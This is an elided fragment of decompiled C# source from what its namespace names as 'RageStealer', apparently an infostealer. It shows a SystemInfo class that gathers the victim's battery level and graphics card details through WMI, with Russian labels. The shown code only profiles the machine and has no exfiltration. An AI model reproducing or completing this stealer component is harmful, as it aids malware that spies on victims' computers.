...
namespace RageStealer.Target.Graber;
...
internal class SystemInfo
{
	...
	public static string GetBattery()
	{
		...
		try
		{
			...
			string text2 = SystemInformation.PowerStatus.BatteryLifePercent.ToString(CultureInfo.InvariantCulture).Split(new char[1] { ',' })[^1];
			return text + " (" + text2 + "%)";
		}
		catch
		{
		...
		try
		{
			...
			try
			{
				if (enumerator.MoveNext())
				{
					...
					string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("Имя видеокарты: " + ((ManagementBaseObject)val)["Caption"], "Версия драйвера: ", ((ManagementBaseObject)val)["DriverVersion"]?.ToString()), "Архитектура GPU: ", ((ManagementBaseObject)val)["VideoArchitecture"]?.ToString()), "Текущий режим видео: ", ((ManagementBaseObject)val)["CurrentBitsPerPixel"]?.ToString(), " бит"), "Производитель: ", ((ManagementBaseObject)val)["AdapterCompatibility"]?.ToString()), "Объем видеопамяти: ", ((ManagementBaseObject)val)["AdapterRAM"]?.ToString(), " байт");
